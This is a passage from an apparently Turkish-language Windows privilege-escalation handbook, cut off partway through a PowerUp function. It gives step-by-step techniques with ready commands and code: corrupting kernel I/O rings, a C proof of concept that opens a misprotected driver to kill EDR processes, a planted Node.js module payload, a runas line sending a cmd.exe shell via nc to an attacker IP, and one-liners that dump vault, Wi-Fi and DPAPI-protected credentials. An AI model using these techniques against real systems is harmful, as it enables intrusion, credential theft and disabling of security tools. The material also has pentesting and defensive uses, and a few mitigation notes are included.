- **Pointer bakımından zengin yeniden doldurma hedefleri**: Windows **I/O ring** registered-buffer array'leri, paged-pool boyutları saldırgan tarafından kontrol edilebildiği (`8 * regBufferCnt`) ve her öğe bir `_IOP_MC_BUFFER_ENTRY` kernel pointer'ı olduğu için mükemmel bilgi sızdırma hedefleridir. Bu array'lerden birini sızdırın, çevresindeki `IORING_OBJECT`'i bulun, ardından **`RegBuffers`** ve **`RegBuffersCount`** değerlerini bozarak sonraki I/O ring işlemlerinin saldırganın oluşturduğu girdileri kullanmasını ve keyfi kernel read/write sağlamasını sağlayın. Kullanılabilir tek write sabit bir byte veriyorsa (örneğin `KUSER_SHARED_DATA+0x14` üzerinden), `0x0101010101010101` gibi tekrarlanan byte'lardan oluşan bir user pointer oluşturmak için **hizalanmamış, çakışan write'lar** kullanın; pointer'ı `VirtualAlloc` ile map edip sahte registered-buffer array'ini oraya yerleştirin.<sup>[[30]](#references)</sup>

Yararlı debugging göstergeleri:

```text
NtCancelIoFileEx -> IopCsqCancelRoutine -> <driver>!RemoveIo
<driver> success path: Acquire -> CompleteRequest/free -> Release
RtlCopyToUser after releasing the object lock
ExAllocatePool2(..., 8 * regBufferCnt, 'BRrI')-style variable-sized pointer arrays
```

Bozuk I/O ring'den arbitrary kernel read/write elde ettikten sonra, standart post-primitive workflow'u kullanarak bir SYSTEM token çalın:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Registry hive memory corruption primitives

Modern hive zafiyetleri, deterministik bellek düzenleri oluşturmanıza, yazılabilir HKLM/HKU alt anahtarlarını kötüye kullanmanıza ve metadata corruption'ı özel bir driver olmadan kernel paged-pool overflow'larına dönüştürmenize olanak tanır. Zincirin tamamını burada öğrenin:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Saldırgan denetimindeki path'lerden kaynaklanan `RtlQueryRegistryValues` direct-mode type confusion

Bazı driver'lar userland'den bir registry path kabul eder, bunun geçerli bir UTF-16 string olduğunu doğrulamakla yetinir ve ardından `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` çağrısını `int readValue` gibi bir stack scalar'a yönelik `RTL_QUERY_REGISTRY_DIRECT` ile yapar. `RTL_QUERY_REGISTRY_TYPECHECK` yoksa `EntryContext`, geliştiricinin beklediği türe göre değil, registry'deki **gerçek** türe göre yorumlanır.

Bu, iki kullanışlı primitive oluşturur:<sup>[[24]](#references)[[25]](#references)</sup>

- **Confused deputy / oracle**: Kullanıcının denetimindeki mutlak bir `\Registry\...` path'i, driver'ın saldırganın seçtiği anahtarları sorgulamasına, dönüş kodları/loglar üzerinden anahtarların varlığını sızdırmasına ve bazen çağıranın doğrudan erişemediği değerleri okumasına olanak tanır.
- **Kernel memory corruption**: `&readValue` gibi bir scalar hedef, registry value türüne bağlı olarak `REG_QWORD`, `UNICODE_STRING` veya boyutlandırılmış bir binary buffer olarak type confusion'a uğrar.

Pratik exploitation notları:

- **Windows 8+ mitigation**: Sorgu, `RTL_QUERY_REGISTRY_DIRECT` ile ancak `RTL_QUERY_REGISTRY_TYPECHECK` olmadan bir **untrusted hive**'a ulaşırsa kernel çağıranları `KERNEL_SECURITY_CHECK_FAILURE (0x139)` ile çöker. Exploitability'yi korumak için değerleri `HKCU` altında hazırlamak yerine **trusted system hive'lar içindeki saldırgan tarafından yazılabilir anahtarları** arayın.
- **Trusted-hive staging**: Yazılabilir `\Registry\Machine` alt anahtarlarını listelemek için NtObjectManager kullanın ve sandbox'lı bağlamlardan erişilebilen anahtarları bulmak için taramayı çoğaltılmış bir **low-integrity** token ile yeniden çalıştırın:<sup>[[26]](#references)</sup>

```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```

- **`REG_QWORD`**: 4 baytlık bir `int` değişkenine doğrudan 8 bayt yazılması, bitişik stack verilerini bozar ve yakındaki bir callback/function pointer'ı kısmen üzerine yazabilir.
- **`REG_SZ` / `REG_EXPAND_SZ`**: direct mode, `EntryContext`'in bir `UNICODE_STRING`'i göstermesini bekler. Kod önce saldırganın kontrolündeki bir `REG_DWORD` değerini stack scalar'a yükleyip ardından aynı buffer'ı string okuması için yeniden kullanırsa saldırgan `Length`/`MaximumLength` değerlerini kontrol eder ve `Buffer` pointer'ını kısmen etkileyerek kısmen kontrol edilen bir kernel write elde eder.
- **`REG_BINARY`**: Büyük binary veriler için direct mode, `EntryContext`'teki ilk `LONG` değerini işaretli bir buffer boyutu olarak ele alır. Önceki bir `REG_DWORD` okuması, yeniden kullanılan scalar'da saldırganın kontrol ettiği **negatif** bir değer bırakırsa sonraki `REG_BINARY` sorgusu saldırganın baytlarını doğrudan bitişik stack slot'larının üzerine kopyalar. Bu, genellikle callback-pointer'ın tamamının üzerine yazmak için en kolay yoldur.

Güçlü bir hunting pattern: **yeniden başlatılmadan aynı stack variable'a yapılan farklı türlerdeki registry read işlemleri**. `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, yeniden kullanılan `EntryContext` pointer'ları ve ilk registry read'in ikinci read'in yapılıp yapılmayacağını belirlediği kod yolları için grep yapın.

#### Device object'lerde FILE_DEVICE_SECURE_OPEN olmamasından yararlanma (LPE + EDR kill)

Bazı imzalı üçüncü taraf driver'lar, IoCreateDeviceSecure kullanarak güçlü bir SDDL ile device object oluşturur ancak DeviceCharacteristics içinde FILE_DEVICE_SECURE_OPEN ayarlamayı unutur. Bu flag olmadığında, device fazladan bir bileşen içeren bir path üzerinden açılırken güvenli DACL uygulanmaz; böylece ayrıcalıksız herhangi bir kullanıcı aşağıdaki gibi bir namespace path kullanarak handle alabilir:<sup>[[14]](#references)</sup>

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (gerçek dünyadaki bir vakadan)

Kullanıcı device'ı açabildiğinde, driver'ın sunduğu ayrıcalıklı IOCTL'ler LPE ve tampering için kötüye kullanılabilir. Gerçek dünyada gözlemlenen örnek yetenekler:
- İstenilen process'lere tam erişimli handle'lar döndürme (token theft / DuplicateTokenEx/CreateProcessAsUser aracılığıyla SYSTEM shell).
- Kısıtlamasız raw disk read/write (offline tampering, boot-time persistence hileleri).
- Protected Process/Light (PP/PPL) dahil istenilen process'leri sonlandırma; böylece kullanıcı alanından kernel aracılığıyla AV/EDR kill işlemi yapma.

Minimal PoC pattern'i (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```

Mitigations for developers
- DACL ile kısıtlanması amaçlanan device object'leri oluştururken her zaman FILE_DEVICE_SECURE_OPEN ayarını yapın.
- Ayrıcalıklı işlemler için çağıranın bağlamını doğrulayın. İşlemin sonlandırılmasına veya handle döndürülmesine izin vermeden önce PP/PPL kontrolleri ekleyin.
- IOCTL'leri kısıtlayın (access mask'leri, METHOD_*, input doğrulaması) ve doğrudan kernel ayrıcalıkları yerine brokered modelleri değerlendirin.

Detection ideas for defenders
- Şüpheli device adlarına (örn. \\ .\\amsdk*) yönelik user-mode açılışlarını ve kötüye kullanıma işaret eden belirli IOCTL dizilerini izleyin.
- Microsoft’un vulnerable driver blocklist'ini (HVCI/WDAC/Smart App Control) zorunlu kılın ve kendi allow/deny list'lerinizi güncel tutun.


## PATH DLL Hijacking

**PATH üzerindeki bir klasörde yazma izinleriniz** varsa, bir işlem tarafından yüklenen bir DLL'i hijack edip **ayrıcalıkları yükseltebilirsiniz**.<sup>[[2]](#references)</sup>

PATH içindeki tüm klasörlerin izinlerini kontrol edin:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Bu denetimin nasıl kötüye kullanılacağı hakkında daha fazla bilgi için:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## `C:\node_modules` üzerinden Node.js / Electron modül çözümleme hijacking'i

Bu, `require("foo")` gibi yalın bir import gerçekleştirdiklerinde ve beklenen modül **bulunamadığında**, **Node.js** ve **Electron** uygulamalarını etkileyen bir **Windows denetimsiz arama yolu** varyantıdır.<sup>[[20]](#references)</sup>

Node, dizin ağacında yukarı doğru ilerleyerek her üst dizindeki `node_modules` klasörlerini kontrol eder. Windows'ta bu arama sürücü köküne kadar ulaşabilir; bu nedenle `C:\Users\Administrator\project\app.js` konumundan başlatılan bir uygulama şunları arayabilir:<sup>[[21]](#references)</sup>

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

**Düşük ayrıcalıklı bir kullanıcı** `C:\node_modules` oluşturabiliyorsa, kötü amaçlı bir `foo.js` (veya paket klasörü) yerleştirip eksik bağımlılığı çözümleyecek **daha yüksek ayrıcalıklı bir Node/Electron sürecini** bekleyebilir. Payload, kurban sürecinin güvenlik bağlamında çalıştırılır. Bu nedenle hedef yönetici olarak, yükseltilmiş bir zamanlanmış görev/hizmet sarmalayıcısı üzerinden ya da otomatik başlatılan ayrıcalıklı bir masaüstü uygulaması olarak çalışıyorsa bu durum **LPE**'ye dönüşür.

Bu durum özellikle şu senaryolarda yaygındır:

- bir bağımlılık `optionalDependencies` içinde tanımlanmışsa<sup>[[22]](#references)</sup>
- üçüncü taraf bir kütüphane `require("foo")` ifadesini `try/catch` içine alıp hata durumunda çalışmaya devam ediyorsa
- bir paket üretim derlemelerinden kaldırılmışsa, paketleme sırasında eklenmemişse veya yüklenememişse
- güvenlik açığı içeren `require()` ana uygulama kodunda değil, bağımlılık ağacının derinlerinde bulunuyorsa

### Güvenlik açığı bulunan hedefleri tespit etme

Çözümleme yolunu doğrulamak için **Procmon** kullanın:<sup>[[23]](#references)</sup>

- `Process Name` filtresini hedef yürütülebilir dosyaya (`node.exe`, Electron uygulamasının EXE'si veya sarmalayıcı süreci) göre ayarlayın
- `Path` filtresinde `contains` koşuluyla `node_modules` arayın
- `NAME NOT FOUND` sonuçlarına ve `C:\node_modules` altındaki son başarılı açılışa odaklanın

Paketinden çıkarılmış `.asar` dosyalarında veya uygulama kaynaklarında işe yarayan kod inceleme kalıpları:

```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```

### Exploitation

1. Procmon'dan veya kaynak kod incelemesinden **eksik paket adını** belirleyin.
2. Henüz mevcut değilse kök arama dizinini oluşturun:

```powershell
mkdir C:\node_modules
```

3. Beklenen adla tam olarak eşleşen bir modül bırakın:

```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```

4. Kurban uygulamayı tetikleyin. Uygulama `require("foo")` çağrısı yaparsa ve meşru modül yoksa Node, `C:\node_modules\foo.js` dosyasını yükleyebilir.

Bu örüntüye uyan, eksik isteğe bağlı modüllerin gerçek dünya örnekleri arasında `bluebird` ve `utf-8-validate` bulunur; ancak yeniden kullanılabilir olan **tekniktir**: ayrıcalıklı bir Windows Node/Electron sürecinin çözümleneceği herhangi bir **eksik yalın import** bulun.

### Tespit ve güçlendirme fikirleri

- Bir kullanıcı `C:\node_modules` oluşturduğunda veya buraya yeni `.js` dosyaları/paketleri yazdığında uyarı verin.
- `C:\node_modules\*` dizininden okuma yapan yüksek bütünlüklü süreçleri araştırın.
- Üretimde tüm çalışma zamanı bağımlılıklarını paketleyin ve `optionalDependencies` kullanımını denetleyin.
- Üçüncü taraf kodlarda sessiz `try { require("...") } catch {}` örüntülerini inceleyin.
- Kitaplık destekliyorsa isteğe bağlı yoklamaları devre dışı bırakın (örneğin bazı `ws` kurulumlarında, `WS_NO_UTF_8_VALIDATE=1` ile eski `utf-8-validate` yoklaması önlenebilir).

## Ağ

### Paylaşımlar

```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```

### hosts dosyası

hosts dosyasında sabit kodlanmış bilinen diğer bilgisayarları kontrol edin

```
type C:\Windows\System32\drivers\etc\hosts
```

### Ağ Arayüzleri ve DNS

```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```

### Açık Portlar

Dışarıdan **kısıtlı servisleri** kontrol edin.

```bash
netstat -ano #Opened ports?
```

Yerel bir listener için PID'yi işlem sahibi, yürütülebilir dosya yolu ve onu başlatan hizmet veya zamanlanmış görevle ilişkilendirin. Uzaktan denetim hizmeti, yalnızca kimlik doğrulaması ve komut denetimleri izin veriyorsa masaüstü kullanıcısı olarak erişim sağlayabilir. Daha yüksek ayrıcalıklı bir hesapla çalışan özel bir TCP uygulaması ayrı bir inceleme konusudur: listener ve ikili dosyanın yolu yalnızca pasif ipuçlarıdır; kimliği doğrulanmış bir bellek bozulması yolunu değerlendirmek için tam olarak bu ikili dosyanın ve erişilebilir girdisinin analiz edilmesi gerekir. Açık bir bağlantı noktası sistem sürecine ait görünüyorsa arka uç hizmetini ilişkilendirmeden önce [`netsh interface portproxy show all`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface) çıktısıyla karşılaştırın; tek başına bir yönlendirme kuralı, hedefe erişilebildiğini veya hedefin savunmasız olduğunu kanıtlamaz.

### Yönlendirme Tablosu

```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```

### ARP Tablosu

```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```

### Güvenlik Duvarı Kuralları

[**Güvenlik Duvarı ile ilgili komutlar için bu sayfaya göz atın**](../basic-cmd-for-pentesters.md#firewall) **(kuralları listeleme, kural oluşturma, kapatma, kapatma...)**

Ağ keşfi için daha [fazla komut burada](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)

```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```

Binary `bash.exe`, `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` konumunda da bulunabilir.

root user elde ederseniz herhangi bir portu dinleyebilirsiniz (`nc.exe` ile bir portu ilk kez dinlemeye çalıştığınızda, GUI üzerinden `nc`'ye firewall tarafından izin verilip verilmeyeceği sorulur).

```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```

Bash'i root olarak kolayca başlatmak için `--default-user root` seçeneğini deneyebilirsiniz.

`WSL` dosya sistemini `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` klasöründe inceleyebilirsiniz.

WSL içindeki Linux `root` kullanıcısı tek başına Windows Administrator hakları sağlamaz. Mevcut Windows kimliği bir dağıtımın dosya sistemini okuyabiliyorsa, kimlik bilgilerini kaydetmiş olabilecek komutlar için kabuk geçmişi dosyalarını (`/root/.bash_history` dahil) inceleyin; yetki yükseltmek için yine de geçerli, daha yüksek ayrıcalıklı bir hesap ve izin verilen bir kimlik doğrulama yolu gerekir. `LocalState\rootfs` düzeni eski WSL kurulumları için geçerlidir; WSL 2, dağıtımı genellikle bir [`ext4.vhdx` sanal diskinde](https://learn.microsoft.com/en-us/windows/wsl/disk-space) depolar. Bu nedenle önce kullanılan dağıtımı ve depolama yolunu belirleyin. Otomatik sayım sırasında geçmiş dosyalarının içeriğini yazdırmaktan kaçının.

## Windows Kimlik Bilgileri

### Winlogon Kimlik Bilgileri

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```

`DefaultUserName` ve `DefaultDomainName` değerlerini kimlik bilgileri değil, hesap bağlamı olarak değerlendirin. Boş olmayan bir `DefaultPassword` veya `AltDefaultPassword` değeri, kayıt defterinde düz metin olarak bulunan bir bulgudur. `AutoAdminLogon=1` olduğu hâlde okunabilir düz metin parola yoksa, bu yalnızca bir ipucudur: [Sysinternals Autologon parolayı LSA secret olarak saklayabilir](https://learn.microsoft.com/en-us/sysinternals/downloads/autologon) ve kayıt defterinin sıradan şekilde okunması, bu secret’ın var olup olmadığını veya alınabilir olup olmadığını ortaya koymaz. Bir kimlik bilgisi açığını raporlamadan önce erişim haklarını ve gerçek oturum açma yapılandırmasını inceleyin.

### Credentials manager / Windows vault

Şuradan: [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)<sup>[[34]](#references)</sup>\
Windows Vault, **Windows**'un **kullanıcıları otomatik olarak oturum açtırmak** için kullanabileceği sunuculara, web sitelerine ve diğer programlara ait kullanıcı kimlik bilgilerini saklar. İlk bakışta bu, kullanıcıların Facebook, Twitter veya Gmail gibi siteler için kimlik bilgilerini saklayıp tarayıcıların otomatik olarak oturum açmasını sağlayabileceği anlamına gelebilir; ancak sistem böyle çalışmaz.

Windows Vault, Windows'un kullanıcıları otomatik olarak oturum açtırmak için kullanabileceği kimlik bilgilerini saklar. Bu, bir kaynağa (sunucu veya web sitesi) erişmek için kimlik bilgilerine ihtiyaç duyan herhangi bir **Windows uygulamasının bu Credential Manager ve Windows Vault'tan yararlanabileceği** ve kullanıcıların her seferinde kullanıcı adı ve parola girmesi yerine sağlanan kimlik bilgilerini kullanabileceği anlamına gelir.

Uygulamalar Credential Manager ile etkileşime girmediği sürece, belirli bir kaynağa ait kimlik bilgilerini kullanabileceklerini sanmıyorum. Bu nedenle, uygulamanız kasadan yararlanmak istiyorsa, varsayılan depolama kasasındaki o kaynağa ait kimlik bilgilerini **istemek için Credential Manager ile bir şekilde iletişim kurmalıdır**.

Makinede kayıtlı kimlik bilgilerini listelemek için `cmdkey` kullanın.

```bash
cmdkey /list
Currently stored credentials:
 Target: Domain:interactive=WORKGROUP\Administrator
 Type: Domain Password
 User: WORKGROUP\Administrator
```

Ardından, kaydedilmiş kimlik bilgilerini kullanmak için `runas` komutunu `/savecred` seçeneğiyle kullanabilirsiniz. Aşağıdaki örnek, SMB paylaşımı üzerinden uzak bir binary dosyasını çağırıyor.

```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```

Sağlanan kimlik bilgileriyle `runas` kullanma.

```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```

mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html) veya [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1) aracılığıyla.

### UWP PasswordVault / Credential Locker

Modern Windows UWP uygulamaları, Microsoft Edge ve modern sistem hizmetleri; kimlik doğrulama token'larını ve düz metin parolaları Universal Windows Platform (UWP) `PasswordVault` içinde (bu alan `vaultcmd` içinde `Web Credentials` olarak da görünür) saklar. Bu depolama alanı oturumlardan yalıtılmıştır ve yönetici veya `SeDebugPrivilege` hakları olmadan yerel olarak çözülebilir.

Saklanan tüm kullanıcı adlarını ve düz metin parolaları anında dökmek ve şifrelerini çözmek için bu PowerShell komutunu kullanıcının etkin oturumu içinde çalıştırın:

```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
```

### DPAPI

**Data Protection API (DPAPI)**, verilerin simetrik şifrelenmesini sağlayan bir yöntem sunar ve Windows işletim sisteminde ağırlıklı olarak asimetrik özel anahtarların simetrik şifrelenmesi için kullanılır. Bu şifreleme, entropiye önemli ölçüde katkıda bulunmak için bir kullanıcı veya sistem sırrından yararlanır.

**DPAPI, kullanıcının oturum açma sırlarından türetilen bir simetrik anahtar aracılığıyla anahtarların şifrelenmesini sağlar**. Sistem şifrelemesi söz konusu olduğunda, sistemin etki alanı kimlik doğrulama sırlarını kullanır.

DPAPI kullanılarak şifrelenen kullanıcı RSA anahtarları, `{SID}` kullanıcının [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) değerini temsil etmek üzere `%APPDATA%\Microsoft\Protect\{SID}` dizininde saklanır. **Kullanıcının özel anahtarlarını koruyan master key ile aynı dosyada bulunan DPAPI anahtarı**, genellikle 64 baytlık rastgele veriden oluşur. (Bu dizine erişimin kısıtlı olduğunu ve içeriğinin CMD'deki `dir` komutuyla listelenemediğini, ancak PowerShell üzerinden listelenebildiğini unutmayın.)

```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```

Bunu decrypt etmek için uygun argümanlarla (`/pvk` veya `/rpc`) **mimikatz module** `dpapi::masterkey` kullanabilirsiniz.

**Ana parola ile korunan kimlik bilgisi dosyaları** genellikle şu konumda bulunur:

```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

You can **mimikatz modülünü** `dpapi::cred` uygun `/masterkey` ile kullanarak şifresini çözebilirsiniz.\
(root iseniz) `sekurlsa::dpapi` modülüyle **bellekten** birçok DPAPI **masterkey** çıkarabilirsiniz.


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Kimlik Bilgileri

**PowerShell kimlik bilgileri**, şifrelenmiş kimlik bilgilerini kolayca saklama yöntemi olarak **script yazma** ve otomasyon görevlerinde sıkça kullanılır. Kimlik bilgileri **DPAPI** ile korunur; bu genellikle yalnızca oluşturuldukları bilgisayardaki aynı kullanıcı tarafından şifrelerinin çözülebileceği anlamına gelir.

Dışa aktarılan bir kimlik bilgisi rastgele bir dosya adına veya `.xml` yoluna sahip olabilir. Bir script veya dosya envanteri böyle bir dosyaya işaret ettiğinde, `C:\Users` dizinini varsaymak yerine hesabın gerçek profil dizinini bulun: [Windows profilleri başka konumlara yerleştirebilir](https://learn.microsoft.com/en-us/windows/win32/shell/profiles-directory). Dosyanın okunabilir olması yalnızca bir ipucudur; [Windows `Export-Clixml`, şifrelenmiş bir kimlik bilgisini dışa aktaran kullanıcıya ve bilgisayara bağlar](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/export-clixml) ve kurtarılan hesabın hedef hizmette ayrıca geçerli haklara sahip olması gerekir. Rutin envanter çıkarma sırasında şifrelenmiş veya açık metin değerlerini yazdırmadan önce yolları ve ACL'leri inceleyin.

Bir dosyada bulunan PS kimlik bilgilerinin şifresini çözmek için şunu yapabilirsiniz:

```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```

### Wifi

```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```

### Kaydedilmiş RDP Bağlantıları

Bunları `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers`\  
ve `HKCU\Software\Microsoft\Terminal Server Client\Servers\` altında bulabilirsiniz.

### Son Çalıştırılan Komutlar

```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```

### **Uzak Masaüstü Kimlik Bilgisi Yöneticisi**

```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```

Use **Mimikatz** `dpapi::rdg` modülünü, uygun `/masterkey` ile **herhangi bir .rdg dosyasının şifresini çözmek** için kullanın\
Bellekten **çok sayıda DPAPI masterkey çıkarabilirsiniz**; bunun için Mimikatz `sekurlsa::dpapi` modülünü kullanın

**mRemoteNG farklı bir bağlantı deposu kullanır.** `%APPDATA%\mRemoteNG` ve kullanıcının Documents klasöründeki okunabilir XML dosyalarını, `config.xml` gibi sıradan adlara sahip dosyalar da dahil olmak üzere inceleyin. Bir XML dosyasını kimlik bilgileri için aday olarak değerlendirmeden önce bağlantı şemasını ve şifrelenmiş `Password` özniteliklerini belirleyin. Saklanan değer bir DPAPI/RDCMan parolası değildir; kurtarma, dosyanın şifreleme ayarlarına ve özel bir master password kullanılıp kullanılmadığına bağlıdır. Geniş kapsamlı taramalarda şifrelenmiş değerleri yazdırmaktan kaçının.

**Remote Desktop Plus profil dışa aktarımları** kullanıcı dizinlerinde veya paylaşılan bir yönetim klasöründe okunabilir durumda olabilir. Eski bir `profiles.xml` dışa aktarımı, `ProfileName`, `Password` ve `Secure` öğelerini içeren `Data/Profile` girdilerine sahiptir. Boş olmayan bir parola öğesini, yazdırmadan veya düz metin olduğunu varsaymadan, kimlik bilgileri için aday olarak değerlendirin: [üreticinin notlarına](https://www.donkz.nl/) göre profil koruması profili oluşturan hesaba ve bilgisayara bağlanabilir veya daha gevşek yapılandırılabilir. Buna güvenmeden önce dosyanın kaynağını ve kurtarma koşullarını doğrulayın.

### Sticky Notes

İnsanlar Windows iş istasyonlarında **parolaları** ve diğer bilgileri kaydetmek için sık sık StickyNotes uygulamasını kullanır, bunun bir veritabanı dosyası olduğunun farkında olmaz. Bu dosya `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` konumundadır ve her zaman aranıp incelenmeye değerdir.

İnsanlar bazen yapışkan not uygulamalarında parola ve diğer bilgileri saklar. Microsoft'un paketlenmiş Sticky Notes uygulaması notları genellikle `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` konumunda saklar; eski veya farklı uygulamalar, LevelDB dahil olmak üzere, kullanıcı profillerinde başka depolama alanları kullanabilir. Eksik bir SQLite dosyasını notların bulunmadığına kanıt saymadan önce yüklü uygulamayı ve depolama biçimini belirleyin.

Sticky Notes, SQLite write-ahead logging kullanıyorsa yalnızca `plum.sqlite` dosyasının bir kopyası yakın zamanda kaydedilmiş notları içermeyebilir. Veritabanının tutarlı bir kopyasıyla birlikte eşleşen `plum.sqlite-wal` dosyasını da saklayın ve mevcutsa `plum.sqlite-shm` dosyasını ekleyin; paylaşılan bellek dizini yeniden oluşturulabilir, ancak WAL veritabanının kalıcı durumunun bir parçasıdır. [SQLite'ın WAL belgelerine](https://www.sqlite.org/wal.html) bakın. Hesap adı veya parola içeren bir not, yalnızca kimlik bilgileri için bir adaydır: hesabı, izin verilen erişimi ve parola tekrar kullanımını ayrıca doğrulayın. Şifrelenmiş bir parola yöneticisi kaydı, daha yüksek ayrıcalıklı bir oturumu kanıtlayabilmek için gerçek şifre çözme anahtarını ve uygulamaya özgü yorumlamayı da gerektirir.

### AppCmd.exe

**AppCmd.exe'den parolaları kurtarmak için Administrator olmanız ve High Integrity düzeyinde çalıştırmanız gerektiğini unutmayın.**\
**AppCmd.exe**, `%systemroot%\system32\inetsrv\` dizininde bulunur.\
Bu dosya varsa, bazı **kimlik bilgileri** yapılandırılmış ve **kurtarılabilir** olabilir.

Bu kod [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) kaynağından alınmıştır:

```bash
function Get-ApplicationHost {
    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    # Check if appcmd.exe exists
    if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
        # Create data table to house results
        $DataTable = New-Object System.Data.DataTable

        # Create and name columns in the data table
        $Null = $DataTable.Columns.Add("user")
        $Null = $DataTable.Columns.Add("pass")
        $Null = $DataTable.Columns.Add("type")
        $Null = $DataTable.Columns.Add("vdir")
